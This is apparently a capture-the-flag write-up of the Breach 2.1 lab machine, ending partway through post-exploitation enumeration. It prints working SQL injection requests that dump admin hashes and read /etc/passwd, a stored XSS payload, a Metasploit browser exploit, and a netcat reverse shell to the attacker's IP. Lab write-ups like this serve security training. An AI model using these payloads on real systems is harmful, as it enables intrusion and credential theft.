I"Է<p>This is the second machine of the serie, is a boot2root/CTF challenge created by <strong>mrb3n</strong>, which attempts to showcase a real-world scenario, with plenty of twists and trolls along the way.</p>

<h2 id="information-gathering">Information Gathering</h2>
<p>The VM is configured with a static IP (192.168.110.151) so you’ll need to configure your host only adaptor to this subnet, so I add an IP address to the vmnet1 interface.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/breach2.1<span class="nv">$ </span>ip addr add 192.168.110.150/24 dev vmnet1
root@kali:~/breach2.1<span class="nv">$ </span>ping <span class="nt">-c</span> 1 192.168.110.151
PING 192.168.110.151 <span class="o">(</span>192.168.110.151<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 192.168.110.151: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>1.18 ms

<span class="nt">---</span> 192.168.110.151 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 1.175/1.175/1.175/0.000 ms
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>I performed a full TCP port scan with nmap and found only three available ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/breach2.1<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p1-65535</span> <span class="nt">-T5</span> 192.168.110.151 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT      STATE SERVICE
111/tcp   open  rpcbind
37497/tcp open  unknown
65535/tcp open  unknown
...
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>With nmap I performed the version and OS detection, script scanning and traceroute of the TCP open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/breach2.1<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p111</span>,47429,65535 <span class="nt">-A</span> 192.168.110.151 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT      STATE SERVICE VERSION
111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          39414/udp6  status
|   100024  1          37497/tcp   status
|   100024  1          53307/tcp6  status
|_  100024  1          54898/udp   status
37497/tcp open  status  1 <span class="o">(</span>RPC <span class="c">#100024)</span>
65535/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   1024 f3:53:9a:0b:40:76:b1:02:87:3e:a5:7a:ae:85:9d:26 <span class="o">(</span>DSA<span class="o">)</span>
|   2048 9a:a8:db:78:4b:44:4f:fb:e5:83:6b:67:e3:ac:fb:f5 <span class="o">(</span>RSA<span class="o">)</span>
|   256 c1:63:f1:dc:8f:24:81:82:35:fa:88:1a:b8:73:40:24 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 3b:4d:56:37:5e:c3:45:75:15:cd:85:00:4f:8b:a8:5e <span class="o">(</span>ED25519<span class="o">)</span>
...
</code></pre></div></div>

<h3 id="ssh-enumeration">SSH Enumeration</h3>

<p>Without having found anything important about the previous scan, I proceeded to enumerate the SSH service.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/breach2.1<span class="nv">$ </span>ssh root@192.168.110.151 <span class="nt">-p</span> 65535
The authenticity of host <span class="s1">'[192.168.110.151]:65535 ([192.168.110.151]:65535)'</span> can<span class="s1">'t be established.
ECDSA key fingerprint is SHA256:r3uJxHJmvGvDbfvH0Y90EO5UAQNeokBIsxs6eDNpEdU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="o">[</span>192.168.110.151]:65535<span class="s1">' (ECDSA) to the list of known hosts.

#############################################################################
#                  Welcome to Initech Cyber Consulting, LLC                 #
#                 All connections are monitored and recorded                #
#                     Unauthorized access is encouraged                     #
#             Peter, if that'</span>s you - the password is <span class="k">in </span>the source.         <span class="c">#</span>
<span class="c">#          Also, stop checking your blog all day and enjoy your vacation!   # </span>
<span class="c">#############################################################################</span>
</code></pre></div></div>

<p>In the banner I could see that the Peter user exists and his password is in the source. What source?</p>

<p>After a long time without having results, I tried login with the user peter and the password <strong>inthesource</strong>, this works, but the connection was closed.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/breach2.1<span class="nv">$ </span>ssh peter@192.168.110.151 <span class="nt">-p65535</span>
<span class="c">#############################################################################</span>
<span class="c">#                  Welcome to Initech Cyber Consulting, LLC                 #</span>
<span class="c">#                 All connections are monitored and recorded                #</span>
<span class="c">#                     Unauthorized access is encouraged                     #</span>
<span class="c">#             Peter, if that's you - the password is in the source.         #</span>
<span class="c">#          Also, stop checking your blog all day and enjoy your vacation!   # </span>
<span class="c">#############################################################################</span>
peter@192.168.110.151<span class="s1">'s password: 
Connection to 192.168.110.151 closed.
</span></code></pre></div></div>

<p>What happens here, so I decided to re-scan all TCP ports, and I could see port 80 open.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/breach2.1<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p1-65535</span> <span class="nt">-T5</span> <span class="nt">-A</span> 192.168.110.151
...
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Initech Cyber Consulting, LLC
...
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>So I decided to interact with the web service and I found a welcome message and an image.</p>

<p><img src="/assets/images/breach2/screenshot-1.png" alt="" /></p>

<p>Then I proceeded to run dirbuster to find hidden files and directories.</p>

<p><img src="/assets/images/breach2/screenshot-2.png" alt="" /></p>

<p><img src="/assets/images/breach2/screenshot-3.png" alt="" /></p>

<p>In the results we can see that the blog directory exists, I access it, and redirected me to a blog.</p>

<p><img src="/assets/images/breach2/screenshot-4.png" alt="" /></p>

<p>With searchsploit I looked for known vulnerabilities for BlogPHP it is a simple blog script, includes features such as adding blogs, comments, upload files and more, it is also quite old so I found many vulnerabilities.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/breach2.1<span class="nv">$ </span>searchsploit blogphp
<span class="nt">-----------------------------------------------------------------------------</span> <span class="nt">-------------------------</span>
 Exploit Title                                                               |  Path
<span class="nt">-----------------------------------------------------------------------------</span> <span class="nt">-------------------------</span>
BlogPHP 1.0 - <span class="s1">'index.php'</span> SQL Injection                                      | php/webapps/27099.txt
BlogPHP 1.2 - Multiple SQL Injections                                        | php/webapps/27117.txt
BlogPHP 2 - <span class="s1">'id'</span> Cross-Site Scripting / SQL Injection                        | php/webapps/5042.txt
BlogPHP 2.0 - <span class="s1">'index.php'</span> Multiple Cross-Site Scripting Vulnerabilities      | php/webapps/31774.txt
BlogPHP 2.0 - Persistent Cross-Site Scripting                                | php/webapps/17640.txt
BlogPHP 2.0 - Privilege Escalation / SQL Injection                           | php/webapps/5909.pl
<span class="nt">-----------------------------------------------------------------------------</span> <span class="nt">-------------------------</span>
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="sql-injection">SQL Injection</h3>

<p>I focused in SQL Injection vulnerability, I copied the 5442.txt file to my current directory, and read the specifications to exploit it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/breach2.1<span class="nv">$ </span>searchsploit <span class="nt">-m</span> php/webapps/5042.txt
  Exploit: BlogPHP 2 - <span class="s1">'id'</span> Cross-Site Scripting / SQL Injection
      URL: https://www.exploit-db.com/exploits/5042
     Path: /usr/share/exploitdb/exploits/php/webapps/5042.txt
File Type: Perl script text executable

Copied to: /root/breach2.1/5042.txt
</code></pre></div></div>

<p>The SQL statement to exploit that vulnerability doesn’t work, so I proceeded to rebuild the SQL statement and finaly it works.</p>

<p><strong>Listing databases</strong></p>

<p>On the blog database I didn’t find anything, so I focused on <strong>oscommerce</strong> database this looks interesting.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/breach2.1<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s1">'http://192.168.110.151/blog/index.php?act=page&amp;id=999999999%27%20union%20select%200,1,table_schema,3,4%20from%20information_schema.tables%20--%20-'</span> | <span class="nb">tr</span> <span class="s1">'&lt;'</span> <span class="s1">'\n'</span> | <span class="nb">grep</span> <span class="nt">-P</span> <span class="s1">'br /&gt;\w'</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">"&gt;"</span> <span class="s1">'{print $NF}'</span>
information_schema 
blog 
mysql 
oscommerce 
performance_schema
</code></pre></div></div>

<p><strong>Enumerating tables</strong></p>

<p>There are many tables, but I focused on the <strong>osc_administrators</strong> table.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/breach2.1<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s1">'http://192.168.110.151/blog/index.php?act=page&amp;id=999999999%27%20union%20select%200,1,table_name,3,4%20from%20information_schema.tab
les%20where%20table_schema=%27oscommerce%27--%20-'</span> | <span class="nb">tr</span> <span class="s1">'&lt;'</span> <span class="s1">'\n'</span> | <span class="nb">grep</span> <span class="nt">-P</span> <span class="s1">'br /&gt;\w'</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">"&gt;"</span> <span class="s1">'{print $NF}'</span>                                                     
osc_address_book                                                                                                                                                    
osc_administrators                                                                                                                                                  
osc_administrators_access                                                                                                                                           
osc_administrators_log                                                                                                                                              
osc_banners                                                                                                                                                         
osc_banners_history                                                                                                                                                 
osc_categories                                                                                                                                                      
osc_categories_description                                                                                                                                          
osc_configuration                                                                                                                                                   
osc_configuration_group                                                                                                                                             
osc_counter
...
</code></pre></div></div>

<p><strong>Enumerating columns</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/breach2.1<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s1">'http://192.168.110.151/blog/index.php?act=page&amp;id=999999999%27%20union%20select%200,1,column_name,3,4%20from%20information_schema.columns%20where%20table_schema=%27oscommerce%27%20and%20table_name=%27osc_administrators%27--%20-'</span> | <span class="nb">tr</span> <span class="s1">'&lt;'</span> <span class="s1">'\n'</span> | <span class="nb">grep</span> <span class="nt">-P</span> <span class="s1">'br /&gt;\w'</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">"&gt;"</span> <span class="s1">'{print $NF}'</span>
<span class="nb">id 
</span>user_name 
user_password 
</code></pre></div></div>

<p><strong>Retrieving users</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/breach2.1<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s1">'http://192.168.110.151/blog/index.php?act=page&amp;id=999999999%27%20union%20select%200,1,concat%28user_name,0x3a,user_password%29,3,4%20from%20oscommerce.osc_administrators--%20-'</span> | <span class="nb">tr</span> <span class="s1">'&lt;'</span> <span class="s1">'\n'</span> | <span class="nb">grep</span> <span class="nt">-P</span> <span class="s1">'br /&gt;\w'</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">"&gt;"</span> <span class="s1">'{print $NF}'</span>
admin:685cef95aa31989f2edae5e055ffd2c9:32
</code></pre></div></div>

<p>In the output we can see that there is only one record, also in the following picture we can see the password for the MD5 hash.</p>

<p><img src="/assets/images/breach2/screenshot-5.png" alt="" /></p>

<p><strong>Enumerating the system users</strong></p>

<p>Listing the system users, I filtered for those who are using a bash shell, to try brute force via SSH.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/breach2.1<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s1">'http://192.168.110.151/blog/index.php?act=page&amp;id=999999999%27union%20select%200,1,load_file(%27/etc/passwd%27),3,4%20--%20-'</span> | <span class="nb">tail</span> <span class="nt">-n</span> +14 | <span class="nb">head</span> <span class="nt">-n</span> <span class="nt">-4</span> | <span class="nb">sed</span> <span class="s1">'1 s/&lt;table.*&lt;br \/&gt;\(.*\)/\1/'</span> | <span class="nb">grep</span> <span class="s1">'sh$'</span>
root:x:0:0:root:/root:/bin/bash
peter:x:1000:1000:peter,,,:/home/peter:/bin/bash
milton:x:1002:1002::/home/milton:/bin/bash
</code></pre></div></div>

<p><strong>Enumerating the ssh configuration file</strong></p>

<p>At the bottom of the file configuration we can see that only peter can access via ssh, also in the ForceCommand directive we see that a script called startme is being executed after having logged in.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/breach2.1<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s1">'http://192.168.110.151/blog/index.php?act=page&amp;id=999999999%27union%20select%200,1,load_file(%27/etc/ssh/sshd_config%27),3,4%20--%20-'</span> | <span class="nb">tail</span> <span class="nt">-n</span> +14 | <span class="nb">head</span> <span class="nt">-n</span> <span class="nt">-4</span> | <span class="nb">sed</span> <span class="s1">'1 s/&lt;table.*&lt;br \/&gt;\(.*\)/\1/'</span>
...
UsePAM <span class="nb">yes
</span>AllowUsers peter
ForceCommand /usr/bin/startme
AddressFamily inet
</code></pre></div></div>

<p>To find out that what this script does, I listed the contents of <strong>/usr/bin/startme</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/breach2.1<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s1">'http://192.168.110.151/blog/index.php?act=page&amp;id=999999999%27union%20select%200,1,load_file(%27/usr/bin/startme%27),3,4%20--%20-'</span> | <span class="nb">tail</span> <span class="nt">-n</span> +14 | <span class="nb">head</span> <span class="nt">-n</span> <span class="nt">-4</span> | <span class="nb">sed</span> <span class="s1">'1 s/&lt;table.*&lt;br \/&gt;\(.*\)/\1/'</span>
<span class="c">#!/bin/bash</span>

<span class="nb">sudo</span> /etc/init.d/apache2 start &amp;&gt; /dev/null
</code></pre></div></div>

<p>This script is starting the apache server after peter has logged in.</p>

<p>With SQL Injection vulnerability I cannot find a way to run system commands, so I decided research more and try with the Stored Cross Site Scripting, since I could realize that in the image of the home page was writed beef, so I tried with that.</p>

<h3 id="stored-cross-siste-scripting">Stored Cross Siste Scripting</h3>

<p>I copied the 17640.txt file to my current directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/breach2.1<span class="nv">$ </span>searchsploit <span class="nt">-m</span> php/webapps/17640.txt
  Exploit: BlogPHP 2.0 - Persistent Cross-Site Scripting
      URL: https://www.exploit-db.com/exploits/17640
     Path: /usr/share/exploitdb/exploits/php/webapps/17640.txt
File Type: UTF-8 Unicode text, with CRLF line terminators

Copied to: /root/breach2.1/17640.txt
</code></pre></div></div>

<p>In the instructions it indicates that in the register section the field username is vulnerable, also the victim has to request the members module to trigger the malicious instruction, so I put the following payload, this will try to connect to my machine listening on port 4343.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">"http://192.168.110.150:4343"</span>/&gt;
</code></pre></div></div>

<p><img src="/assets/images/breach2/screenshot-6.png" alt="" /></p>

<p>Then we need to start a netcat listener and wait for the target visit the page (in this case a script) and execute our malicious instruction.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/breach2.1<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 4343
listening on <span class="o">[</span>any] 4343 ...
connect to <span class="o">[</span>192.168.110.150] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.110.151] 33045
GET / HTTP/1.1
Host: 192.168.110.150:4343
User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:15.0<span class="o">)</span> Gecko/20100101 Firefox/15.0
Accept: image/png,image/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
Accept-Language: en-us,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
Accept-Encoding: <span class="nb">gzip</span>, deflate
Connection: keep-alive
Referer: http://192.168.110.151/blog/members.html
</code></pre></div></div>

<p>We have captured the request header, in the User-Agent field we see to perform the request version 15 of firefox was used, googling I found that this is vulnerable to code execution due to improper exception handling on objects that dont have the exposedProps property set, it is possible to overwrite functions that get called from a privileged context and silently invoke the AddonManager to install a malicious plugin.</p>

<p>There is a metasploit exploit for this, so launch metasploit and set up it as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/breach2.1<span class="nv">$ </span>msfconsole <span class="nt">-qx</span> <span class="s2">"use exploit/multi/browser/firefox_proto_crmfrequest; </span><span class="se">\</span><span class="s2">
dquote&gt; set srvhost 192.168.110.150; </span><span class="se">\ </span><span class="s2">         
dquote&gt; set srvport 8888; </span><span class="se">\ </span><span class="s2">                               
dquote&gt; set lhost 192.168.110.150; </span><span class="se">\ </span><span class="s2">                      
dquote&gt; run"</span>                                                    
<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to generic/shell_reverse_tcp  
srvhost <span class="o">=&gt;</span> 192.168.110.150                                       
srvport <span class="o">=&gt;</span> 8888                                             
lhost <span class="o">=&gt;</span> 192.168.110.150                                      
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exploit running as background job 0.                   
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exploit completed, but no session was created.              
                                                                     
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 192.168.110.150:4444          
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using URL: http://192.168.110.150:8888/Xqndzuz                
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Server started. 
</code></pre></div></div>

<p>As we can see this created a URL containing the malicious instruction, I tried to create the payload with other HTML tags but it didn’t work except with iframe tag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe <span class="nv">src</span><span class="o">=</span><span class="s2">"http://192.168.110.150:8888/rC9mcJIc"</span> <span class="o">&gt;</span>&lt;/iframe&gt;
</code></pre></div></div>
<p><img src="/assets/images/breach2/screenshot-7.png" alt="" /></p>

<p>Following the same idea we wait a minutes and get a shell with privileges of the user peter.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>multi/browser/firefox_proto_crmfrequest<span class="o">)</span> <span class="o">&gt;</span> <span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.110.151  firefox_proto_crmfrequest - Gathering target information <span class="k">for </span>192.168.110.151           
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.110.151  firefox_proto_crmfrequest - Sending HTML response to 192.168.110.151                                                                           
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.110.151  firefox_proto_crmfrequest - Sending HTML                                                                                                       
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.110.151  firefox_proto_crmfrequest - Sending the malicious addon                                                                                        
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>192.168.110.150:4444 -&gt; 192.168.110.151:42386<span class="o">)</span> at 2021-09-11 23:04:53 <span class="nt">-0500</span>                                                     
                                                                                                                                                                    
msf6 exploit<span class="o">(</span>multi/browser/firefox_proto_crmfrequest<span class="o">)</span> <span class="o">&gt;</span> sessions <span class="nt">-i</span> 1
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting interaction with 1...

<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>peter<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>peter<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>peter<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>netdev<span class="o">)</span>,111<span class="o">(</span>scanner<span class="o">)</span>,115<span class="o">(</span>bluetooth<span class="o">)</span>,1003<span class="o">(</span>fishermen<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.110.151 - Command shell session 1 closed.
</code></pre></div></div>

<p>We have an unstable shell so I decided to switch to a netcat reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>multi/browser/firefox_proto_crmfrequest<span class="o">)</span> <span class="o">&gt;</span> 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.110.151  firefox_proto_crmfrequest - Gathering target information <span class="k">for </span>192.168.110.151
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.110.151  firefox_proto_crmfrequest - Sending HTML response to 192.168.110.151
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.110.151  firefox_proto_crmfrequest - Sending HTML
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.110.151  firefox_proto_crmfrequest - Sending the malicious addon
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 2 opened <span class="o">(</span>192.168.110.150:4444 -&gt; 192.168.110.151:42411<span class="o">)</span> at 2021-09-11 23:12:50 <span class="nt">-0500</span>

msf6 exploit<span class="o">(</span>multi/browser/firefox_proto_crmfrequest<span class="o">)</span> <span class="o">&gt;</span> sessions <span class="nt">-i</span> 2
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting interaction with 2...

nc 192.168.110.150 443 <span class="nt">-e</span> /bin/bash
</code></pre></div></div>

<p>I upgraded to a full TTY shell, and I could see the script that visits the blog every 4 minutes.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/breach2.1<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.110.150] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.110.151] 34017
script <span class="nt">-qc</span> /bin/bash /dev/null
peter@breach2:~<span class="nv">$ </span>^Z
zsh: suspended  nc <span class="nt">-vlnp</span> 443
root@kali:~/breach2.1<span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span>
<span class="o">[</span>1]  + continued  nc <span class="nt">-vlnp</span> 443

peter@breach2:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>screen
peter@breach2:~<span class="nv">$ </span><span class="nb">stty </span>rows 39 columns 164
peter@breach2:~<span class="nv">$ </span><span class="nb">ls
</span>Desktop  Documents  Downloads  firefox.sh  Music  Pictures  Public  Templates  Videos
peter@breach2:~<span class="nv">$ </span><span class="nb">cat </span>firefox.sh 
<span class="c">#!/bin/bash</span>

xvfb-run <span class="nt">--auto-servernum</span> <span class="nt">--server-num</span><span class="o">=</span>1 /opt/firefox/firefox http://192.168.110.151/blog/members.html
peter@breach2:~<span class="nv">$ </span>crontab <span class="nt">-l</span>
...
<span class="k">*</span>/4 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="nb">cd</span> /home/peter <span class="o">&amp;&amp;</span> ./firefox.sh
</code></pre></div></div>

<p>Then I list the services running and found a service enabled on port 2323.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>peter@breach2:~<span class="nv">$ </span>ss <span class="nt">-antl</span>
State      Recv-Q Send-Q          Local Address:Port            Peer Address:Port
LISTEN     0      128                         <span class="k">*</span>:65535                      <span class="k">*</span>:<span class="k">*</span>
LISTEN     0      128                         <span class="k">*</span>:57640                      <span class="k">*</span>:<span class="k">*</span>
LISTEN     0      50                  127.0.0.1:3306                       <span class="k">*</span>:<span class="k">*</span>
LISTEN     0      128                         <span class="k">*</span>:111                        <span class="k">*</span>:<span class="k">*</span>
LISTEN     0      64                  127.0.0.1:2323                       <span class="k">*</span>:<span class="k">*</span>
LISTEN     0      128                        :::49547                     :::<span class="k">*</span>
LISTEN     0      128                        :::111                       :::<span class="k">*</span>
LISTEN     0      128                        :::80                        :::<span class="k">*</span>
</code></pre></div></div>

<p>I connected to that service and found the coordinates of a place, and a log in.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>peter@breach2:~<span class="nv">$ </span>telnet 127.0.0.1 2323
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
29 45<span class="s1">'46" N 95 22'</span>59<span class="s2">" W 
breach2 login: ^CConnection closed by foreign host.
</span></code></pre></div></div>

<p>I searched on google maps and found references of a place located in Houston, after a several attempts of login I discovered that the user is milton and the password is Houston, but there is another problem, ask us, whose stapler is it?</p>

<p><img src="/assets/images/breach2/screenshot-8.png" alt="" /></p>

<p>So I proceed to find for milton readable files and filter for the string stapler.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>peter@breach2:~<span class="nv">$ </span>find / <span class="nt">-readable</span> <span class="nt">-user</span> milton <span class="nt">-type</span> f 2&gt;/dev/null | xargs <span class="nb">grep </span>stapler
/usr/local/bin/cd.py:   question <span class="o">=</span> raw_input<span class="o">(</span><span class="s2">"Whose stapler is it?"</span><span class="o">)</span>
peter@breach2:~<span class="nv">$ </span><span class="nb">cat</span> /usr/local/bin/cd.py
<span class="c">#!/usr/bin/python</span>

import signal
import <span class="nb">time
</span>import os

s <span class="o">=</span> signal.signal<span class="o">(</span>signal.SIGINT, signal.SIG_IGN<span class="o">)</span>

<span class="nv">countdown</span><span class="o">=</span>3

<span class="k">while </span>countdown <span class="o">&gt;</span>0:
        time.sleep<span class="o">(</span>1<span class="o">)</span>
        print<span class="o">(</span>countdown<span class="o">)</span>
        countdown -<span class="o">=</span>1
<span class="k">if </span>countdown &lt;1:
        question <span class="o">=</span> raw_input<span class="o">(</span><span class="s2">"Whose stapler is it?"</span><span class="o">)</span>
<span class="k">if </span>question <span class="o">==</span> <span class="s2">"mine"</span>:
        os.system<span class="o">(</span><span class="s2">"echo 'Woot!'"</span><span class="o">)</span>
<span class="k">else</span>:

        os.system<span class="o">(</span><span class="s2">"kill -9 %d"</span>%<span class="o">(</span>os.getppid<span class="o">()))</span>
        signal.signal<span class="o">(</span>signal.SIGINT, s<span class="o">)</span>
</code></pre></div></div>

<p>I found a python script with the same question, and whose answer is mine, so I logged in and was switched to user milton.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>peter@breach2:~<span class="nv">$ </span>telnet 127.0.0.1 2323  
Trying 127.0.0.1...                        
Connected to 127.0.0.1.                     
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>                                 
29 45<span class="s1">'46" N 95 22'</span>59<span class="s2">" W                              
breach2 login: milton                                    
Password:                                                       
Last login: Wed Jul 20 21:04:18 EDT 2016 from localhost on pts/0       
Linux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64
29 45'46"</span> N 95 22<span class="s1">'59" W                                               
3
2
1
Whose stapler is it?mine
Woot!
milton@breach2:~$ id
uid=1002(milton) gid=1002(milton) groups=1002(milton)
</span></code></pre></div></div>

<p>listing the processes, I could see that the nginx server is running as root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>milton@breach2:~<span class="nv">$ </span>ps aux | <span class="nb">grep </span>nginx
root      1423  0.0  0.5  91184  3008 ?        Ss   14:14   0:00 nginx: master process /usr/sbin/nginx <span class="nt">-g</span> daemon on<span class="p">;</span> master_process on<span class="p">;</span>
root      1424  0.0  0.7  91492  3664 ?        S    14:14   0:00 nginx: worker process                           
root      1425  0.0  0.7  91492  3664 ?        S    14:14   0:00 nginx: worker process                           
root      1426  0.0  0.8  91492  4524 ?        S    14:14   0:00 nginx: worker process                           
root      1427  0.0  0.8  91832  4524 ?        S    14:14   0:00 nginx: worker process                           
milton    1655  0.0  0.4  12728  2212 pts/1    S+   14:32   0:00 <span class="nb">grep </span>nginx
</code></pre></div></div>

<p>So I decided to list the services again, and found the port 8888 open.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>milton@breach2:~<span class="nv">$ </span>ss <span class="nt">-antl</span>
State      Recv-Q Send-Q          Local Address:Port               Peer Address:Port 
LISTEN     0      128                         <span class="k">*</span>:8888                          <span class="k">*</span>:<span class="k">*</span>     
LISTEN     0      128                         <span class="k">*</span>:36026                         <span class="k">*</span>:<span class="k">*</span>     
LISTEN     0      128                         <span class="k">*</span>:65535                         <span class="k">*</span>:<span class="k">*</span>     
LISTEN     0      50                  127.0.0.1:3306                          <span class="k">*</span>:<span class="k">*</span>     
LISTEN     0      128                         <span class="k">*</span>:111                           <span class="k">*</span>:<span class="k">*</span>     
